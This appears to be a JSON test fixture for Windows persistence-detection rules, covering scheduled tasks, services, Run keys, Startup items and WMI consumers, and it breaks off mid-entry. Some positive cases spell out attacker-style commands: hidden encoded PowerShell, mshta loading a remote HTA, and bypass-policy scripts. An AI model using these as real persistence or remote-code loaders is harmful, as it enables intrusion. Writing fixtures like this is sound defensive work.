@@ -1,0 +1,3578 @@
+{
+  "comment": "Synthetic positive and negative scenarios for every rule. expect is the exact number of findings.",
+  "cases": {
+    "WTH-TASK-001": [
+      {
+        "name": "task from AppData fires",
+        "items": [
+          {
+            "TaskName": "Updater",
+            "TaskPath": "\\",
+            "FullName": "\\Updater",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Users\\labuser\\AppData\\Roaming\\Upd\\upd.exe",
+            "ActionArguments": "",
+            "ActionCommandLine": "C:\\Users\\labuser\\AppData\\Roaming\\Upd\\upd.exe",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Users\\labuser\\AppData\\Roaming\\Upd\\upd.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "task from Program Files does not fire",
+        "items": [
+          {
+            "TaskName": "Backup",
+            "TaskPath": "\\",
+            "FullName": "\\Backup",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Program Files\\CorpBackup\\backup.exe",
+            "ActionArguments": "",
+            "ActionCommandLine": "C:\\Program Files\\CorpBackup\\backup.exe",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Program Files\\CorpBackup\\backup.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "Defender platform path under ProgramData is trusted",
+        "items": [
+          {
+            "TaskName": "DefScan",
+            "TaskPath": "\\",
+            "FullName": "\\DefScan",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MpCmdRun.exe",
+            "ActionArguments": "-Scan",
+            "ActionCommandLine": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MpCmdRun.exe -Scan",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MpCmdRun.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "COM handler action has no executable path",
+        "items": [
+          {
+            "TaskName": "ComTask",
+            "TaskPath": "\\",
+            "FullName": "\\ComTask",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "ComHandler",
+            "ActionExecute": null,
+            "ActionArguments": null,
+            "ActionCommandLine": "",
+            "ComClassId": "{00000000-0000-0000-0000-000000000000}",
+            "ExecutablePath": null,
+            "ExecutableExists": null
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-TASK-002": [
+      {
+        "name": "encoded PowerShell fires",
+        "items": [
+          {
+            "TaskName": "Sync",
+            "TaskPath": "\\",
+            "FullName": "\\Sync",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ActionArguments": "-NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+            "ActionCommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -W Hidden -Enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "mshta with URL fires",
+        "items": [
+          {
+            "TaskName": "Web",
+            "TaskPath": "\\",
+            "FullName": "\\Web",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Windows\\System32\\mshta.exe",
+            "ActionArguments": "http://example.com/a.hta",
+            "ActionCommandLine": "C:\\Windows\\System32\\mshta.exe http://example.com/a.hta",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Windows\\System32\\mshta.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "ExecutionPolicy Bypass alone does not fire",
+        "items": [
+          {
+            "TaskName": "Inventory",
+            "TaskPath": "\\",
+            "FullName": "\\Inventory",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ActionArguments": "-NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inventory.ps1",
+            "ActionCommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\inventory.ps1",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "plain script does not fire",
+        "items": [
+          {
+            "TaskName": "Clean",
+            "TaskPath": "\\",
+            "FullName": "\\Clean",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Windows\\System32\\cleanmgr.exe",
+            "ActionArguments": "/sagerun:1",
+            "ActionCommandLine": "C:\\Windows\\System32\\cleanmgr.exe /sagerun:1",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Windows\\System32\\cleanmgr.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-TASK-003": [
+      {
+        "name": "SYSTEM task from ProgramData fires",
+        "items": [
+          {
+            "TaskName": "SysCache",
+            "TaskPath": "\\",
+            "FullName": "\\SysCache",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\ProgramData\\SysCache\\syscache.exe",
+            "ActionArguments": "",
+            "ActionCommandLine": "C:\\ProgramData\\SysCache\\syscache.exe",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\ProgramData\\SysCache\\syscache.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "Highest run level task from AppData fires",
+        "items": [
+          {
+            "TaskName": "HiTask",
+            "TaskPath": "\\",
+            "FullName": "\\HiTask",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "CORP\\labuser",
+            "RunLevel": "Highest",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Users\\labuser\\AppData\\Local\\x\\x.exe",
+            "ActionArguments": "",
+            "ActionCommandLine": "C:\\Users\\labuser\\AppData\\Local\\x\\x.exe",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Users\\labuser\\AppData\\Local\\x\\x.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "limited user task from AppData does not fire",
+        "items": [
+          {
+            "TaskName": "UserTask",
+            "TaskPath": "\\",
+            "FullName": "\\UserTask",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "CORP\\labuser",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Users\\labuser\\AppData\\Local\\x\\x.exe",
+            "ActionArguments": "",
+            "ActionCommandLine": "C:\\Users\\labuser\\AppData\\Local\\x\\x.exe",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Users\\labuser\\AppData\\Local\\x\\x.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "SYSTEM task from Program Files does not fire",
+        "items": [
+          {
+            "TaskName": "Vendor",
+            "TaskPath": "\\",
+            "FullName": "\\Vendor",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Program Files\\Vendor\\v.exe",
+            "ActionArguments": "",
+            "ActionCommandLine": "C:\\Program Files\\Vendor\\v.exe",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Program Files\\Vendor\\v.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-TASK-004": [
+      {
+        "name": "missing executable fires",
+        "items": [
+          {
+            "TaskName": "Stale",
+            "TaskPath": "\\",
+            "FullName": "\\Stale",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Tools\\gone.exe",
+            "ActionArguments": "",
+            "ActionCommandLine": "C:\\Tools\\gone.exe",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Tools\\gone.exe",
+            "ExecutableExists": false
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "unknown existence does not fire",
+        "items": [
+          {
+            "TaskName": "Unknown",
+            "TaskPath": "\\",
+            "FullName": "\\Unknown",
+            "State": "Ready",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Tools\\maybe.exe",
+            "ActionArguments": "",
+            "ActionCommandLine": "C:\\Tools\\maybe.exe",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Tools\\maybe.exe",
+            "ExecutableExists": null
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "disabled task does not fire",
+        "items": [
+          {
+            "TaskName": "Off",
+            "TaskPath": "\\",
+            "FullName": "\\Off",
+            "State": "Disabled",
+            "Author": "CORP\\ITOps",
+            "UserId": "NT AUTHORITY\\SYSTEM",
+            "RunLevel": "Limited",
+            "Hidden": false,
+            "TriggerTypes": [
+              "MSFT_TaskDailyTrigger"
+            ],
+            "ActionIndex": 0,
+            "ActionType": "Exec",
+            "ActionExecute": "C:\\Tools\\gone.exe",
+            "ActionArguments": "",
+            "ActionCommandLine": "C:\\Tools\\gone.exe",
+            "ComClassId": null,
+            "ExecutablePath": "C:\\Tools\\gone.exe",
+            "ExecutableExists": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-SVC-001": [
+      {
+        "name": "service in ProgramData fires",
+        "items": [
+          {
+            "Name": "UpdSvc",
+            "DisplayName": "UpdSvc",
+            "PathName": "C:\\ProgramData\\Evil\\svc.exe",
+            "ExecutablePath": "C:\\ProgramData\\Evil\\svc.exe",
+            "Arguments": "",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "service in Program Files does not fire",
+        "items": [
+          {
+            "Name": "Vendor",
+            "DisplayName": "Vendor",
+            "PathName": "\"C:\\Program Files\\Vendor\\svc.exe\" -k run",
+            "ExecutablePath": "C:\\Program Files\\Vendor\\svc.exe",
+            "Arguments": "-k run",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "Defender service under ProgramData is trusted",
+        "items": [
+          {
+            "Name": "WinDefend",
+            "DisplayName": "WinDefend",
+            "PathName": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe\"",
+            "ExecutablePath": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe",
+            "Arguments": "",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-SVC-002": [
+      {
+        "name": "unquoted path with spaces fires",
+        "items": [
+          {
+            "Name": "VendorSync",
+            "DisplayName": "VendorSync",
+            "PathName": "C:\\Program Files\\Vendor Sync\\syncsvc.exe -run",
+            "ExecutablePath": "C:\\Program Files\\Vendor Sync\\syncsvc.exe",
+            "Arguments": "-run",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": true,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "quoted path does not fire",
+        "items": [
+          {
+            "Name": "VendorSync",
+            "DisplayName": "VendorSync",
+            "PathName": "\"C:\\Program Files\\Vendor Sync\\syncsvc.exe\" -run",
+            "ExecutablePath": "C:\\Program Files\\Vendor Sync\\syncsvc.exe",
+            "Arguments": "-run",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "path without spaces does not fire",
+        "items": [
+          {
+            "Name": "Spooler",
+            "DisplayName": "Spooler",
+            "PathName": "C:\\Windows\\System32\\spoolsv.exe",
+            "ExecutablePath": "C:\\Windows\\System32\\spoolsv.exe",
+            "Arguments": "",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "disabled service does not fire",
+        "items": [
+          {
+            "Name": "Old",
+            "DisplayName": "Old",
+            "PathName": "C:\\Program Files\\Old App\\old.exe",
+            "ExecutablePath": "C:\\Program Files\\Old App\\old.exe",
+            "Arguments": "",
+            "StartMode": "Disabled",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": true,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-SVC-003": [
+      {
+        "name": "cmd wrapper fires",
+        "items": [
+          {
+            "Name": "RemoteHelper",
+            "DisplayName": "RemoteHelper",
+            "PathName": "C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\Temp\\h.bat",
+            "ExecutablePath": "C:\\Windows\\System32\\cmd.exe",
+            "Arguments": "/c C:\\Windows\\Temp\\h.bat",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "encoded PowerShell fires",
+        "items": [
+          {
+            "Name": "PsSvc",
+            "DisplayName": "PsSvc",
+            "PathName": "powershell.exe -nop -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+            "ExecutablePath": "powershell.exe",
+            "Arguments": "-nop -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "svchost service does not fire",
+        "items": [
+          {
+            "Name": "Dhcp",
+            "DisplayName": "Dhcp",
+            "PathName": "C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+            "ExecutablePath": "C:\\Windows\\system32\\svchost.exe",
+            "Arguments": "-k LocalServiceNetworkRestricted -p",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "normal vendor service does not fire",
+        "items": [
+          {
+            "Name": "Agent",
+            "DisplayName": "Agent",
+            "PathName": "\"C:\\Program Files\\Vendor\\agent.exe\" --service",
+            "ExecutablePath": "C:\\Program Files\\Vendor\\agent.exe",
+            "Arguments": "--service",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-SVC-004": [
+      {
+        "name": "missing image fires",
+        "items": [
+          {
+            "Name": "Gone",
+            "DisplayName": "Gone",
+            "PathName": "\"C:\\Program Files\\Gone\\gone.exe\"",
+            "ExecutablePath": "C:\\Program Files\\Gone\\gone.exe",
+            "Arguments": "",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": false
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "unknown existence does not fire",
+        "items": [
+          {
+            "Name": "Unknown",
+            "DisplayName": "Unknown",
+            "PathName": "\"C:\\Program Files\\X\\x.exe\"",
+            "ExecutablePath": "C:\\Program Files\\X\\x.exe",
+            "Arguments": "",
+            "StartMode": "Auto",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": null
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "disabled service does not fire",
+        "items": [
+          {
+            "Name": "Off",
+            "DisplayName": "Off",
+            "PathName": "\"C:\\Program Files\\Gone\\gone.exe\"",
+            "ExecutablePath": "C:\\Program Files\\Gone\\gone.exe",
+            "Arguments": "",
+            "StartMode": "Disabled",
+            "State": "Running",
+            "StartName": "LocalSystem",
+            "UnquotedPathWithSpaces": false,
+            "ExecutableExists": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-REG-001": [
+      {
+        "name": "Run entry in AppData fires",
+        "items": [
+          {
+            "Hive": "HKCU",
+            "KeyPath": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "RunType": "Run",
+            "ValueName": "Prog",
+            "ValueKind": "String",
+            "Data": "\"C:\\Users\\labuser\\AppData\\Local\\Prog\\p.exe\" /silent",
+            "ExecutablePath": "C:\\Users\\labuser\\AppData\\Local\\Prog\\p.exe",
+            "Arguments": "/silent",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "Windows Security tray entry does not fire",
+        "items": [
+          {
+            "Hive": "HKLM",
+            "KeyPath": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "RunType": "Run",
+            "ValueName": "SecurityHealth",
+            "ValueKind": "String",
+            "Data": "%windir%\\system32\\SecurityHealthSystray.exe",
+            "ExecutablePath": "C:\\Windows\\system32\\SecurityHealthSystray.exe",
+            "Arguments": "",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "Program Files entry does not fire",
+        "items": [
+          {
+            "Hive": "HKLM",
+            "KeyPath": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "RunType": "Run",
+            "ValueName": "Agent",
+            "ValueKind": "String",
+            "Data": "\"C:\\Program Files\\Vendor\\agent.exe\"",
+            "ExecutablePath": "C:\\Program Files\\Vendor\\agent.exe",
+            "Arguments": "",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-REG-002": [
+      {
+        "name": "hidden bypass PowerShell fires",
+        "items": [
+          {
+            "Hive": "HKLM",
+            "KeyPath": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "RunType": "Run",
+            "ValueName": "Updater",
+            "ValueKind": "String",
+            "Data": "powershell.exe -nop -w hidden -ep bypass -File C:\\Windows\\Temp\\u.ps1",
+            "ExecutablePath": "powershell.exe",
+            "Arguments": "-nop -w hidden -ep bypass -File C:\\Windows\\Temp\\u.ps1",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "normal entry does not fire",
+        "items": [
+          {
+            "Hive": "HKLM",
+            "KeyPath": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "RunType": "Run",
+            "ValueName": "Agent",
+            "ValueKind": "String",
+            "Data": "\"C:\\Program Files\\Vendor\\agent.exe\" /background",
+            "ExecutablePath": "C:\\Program Files\\Vendor\\agent.exe",
+            "Arguments": "/background",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-STARTUP-001": [
+      {
+        "name": "batch file in Startup fires",
+        "items": [
+          {
+            "Scope": "AllUsers",
+            "Path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run-me.bat",
+            "FileName": "run-me.bat",
+            "Extension": ".bat",
+            "IsShortcut": false,
+            "TargetPath": null,
+            "TargetArguments": null,
+            "TargetCommandLine": "",
+            "LastWriteTimeUtc": "2026-10-15T23:00:00.000Z",
+            "SizeBytes": 1024,
+            "ExecutablePath": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run-me.bat",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "shortcut does not fire",
+        "items": [
+          {
+            "Scope": "AllUsers",
+            "Path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Portal.lnk",
+            "FileName": "Portal.lnk",
+            "Extension": ".lnk",
+            "IsShortcut": true,
+            "TargetPath": "C:\\Program Files\\Portal\\portal.exe",
+            "TargetArguments": "",
+            "TargetCommandLine": "C:\\Program Files\\Portal\\portal.exe",
+            "LastWriteTimeUtc": "2026-10-15T23:00:00.000Z",
+            "SizeBytes": 1024,
+            "ExecutablePath": "C:\\Program Files\\Portal\\portal.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "desktop.ini does not fire",
+        "items": [
+          {
+            "Scope": "AllUsers",
+            "Path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini",
+            "FileName": "desktop.ini",
+            "Extension": ".ini",
+            "IsShortcut": false,
+            "TargetPath": null,
+            "TargetArguments": null,
+            "TargetCommandLine": "",
+            "LastWriteTimeUtc": "2026-10-15T23:00:00.000Z",
+            "SizeBytes": 1024,
+            "ExecutablePath": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-STARTUP-002": [
+      {
+        "name": "shortcut to Temp fires",
+        "items": [
+          {
+            "Scope": "AllUsers",
+            "Path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Helper.lnk",
+            "FileName": "Helper.lnk",
+            "Extension": ".lnk",
+            "IsShortcut": true,
+            "TargetPath": "C:\\Users\\labuser\\AppData\\Local\\Temp\\helper.exe",
+            "TargetArguments": "",
+            "TargetCommandLine": "C:\\Users\\labuser\\AppData\\Local\\Temp\\helper.exe",
+            "LastWriteTimeUtc": "2026-10-15T23:00:00.000Z",
+            "SizeBytes": 1024,
+            "ExecutablePath": "C:\\Users\\labuser\\AppData\\Local\\Temp\\helper.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "shortcut with encoded PowerShell fires",
+        "items": [
+          {
+            "Scope": "AllUsers",
+            "Path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Tool.lnk",
+            "FileName": "Tool.lnk",
+            "Extension": ".lnk",
+            "IsShortcut": true,
+            "TargetPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "TargetArguments": "-enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+            "TargetCommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAeQBuAHQAaABlAHQAaQBjAC0AbABhAGIALQBtAGEAcgBrAGUAcgAnAA==",
+            "LastWriteTimeUtc": "2026-10-15T23:00:00.000Z",
+            "SizeBytes": 1024,
+            "ExecutablePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "shortcut to Program Files does not fire",
+        "items": [
+          {
+            "Scope": "AllUsers",
+            "Path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Portal.lnk",
+            "FileName": "Portal.lnk",
+            "Extension": ".lnk",
+            "IsShortcut": true,
+            "TargetPath": "C:\\Program Files\\Portal\\portal.exe",
+            "TargetArguments": "",
+            "TargetCommandLine": "C:\\Program Files\\Portal\\portal.exe",
+            "LastWriteTimeUtc": "2026-10-15T23:00:00.000Z",
+            "SizeBytes": 1024,
+            "ExecutablePath": "C:\\Program Files\\Portal\\portal.exe",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      },
+      {
+        "name": "non-shortcut file is not evaluated",
+        "items": [
+          {
+            "Scope": "AllUsers",
+            "Path": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notes.txt",
+            "FileName": "notes.txt",
+            "Extension": ".txt",
+            "IsShortcut": false,
+            "TargetPath": null,
+            "TargetArguments": null,
+            "TargetCommandLine": "",
+            "LastWriteTimeUtc": "2026-10-15T23:00:00.000Z",
+            "SizeBytes": 1024,
+            "ExecutablePath": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\notes.txt",
+            "ExecutableExists": true
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-WMI-001": [
+      {
+        "name": "command line consumer fires",
+        "items": [
+          {
+            "Kind": "CommandLineEventConsumer",
+            "Name": "SysHealthConsumer",
+            "CommandLineTemplate": "powershell.exe -File C:\\ProgramData\\hb.ps1",
+            "ExecutablePath": null,
+            "ScriptingEngine": null,
+            "ScriptTextPreview": null,
+            "ScriptTextLength": 0,
+            "FilterName": "SysHealthFilter",
+            "FilterQuery": "SELECT * FROM __InstanceModificationEvent WITHIN 60",
+            "Bound": true
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "active script consumer fires",
+        "items": [
+          {
+            "Kind": "ActiveScriptEventConsumer",
+            "Name": "ScriptConsumer",
+            "CommandLineTemplate": null,
+            "ExecutablePath": null,
+            "ScriptingEngine": "VBScript",
+            "ScriptTextPreview": "MsgBox \"synthetic\"",
+            "ScriptTextLength": 18,
+            "FilterName": null,
+            "FilterQuery": null,
+            "Bound": false
+          }
+        ],
+        "expect": 1
+      },
+      {
+        "name": "other consumer class does not fire",
+        "items": [
+          {
+            "Kind": "NTEventLogEventConsumer",
+            "Name": "SCM Event Log Consumer",
+            "CommandLineTemplate": null,
+            "ExecutablePath": null,
+            "ScriptingEngine": null,
+            "ScriptTextPreview": null,
+            "ScriptTextLength": 0,
+            "FilterName": null,
+            "FilterQuery": null,
+            "Bound": false
+          }
+        ],
+        "expect": 0
+      }
+    ],
+    "WTH-ACCT-001": [
+      {
+        "name": "unexpected administrator fires",
+        "items": [
+          {
+            "Group": "Administrators",
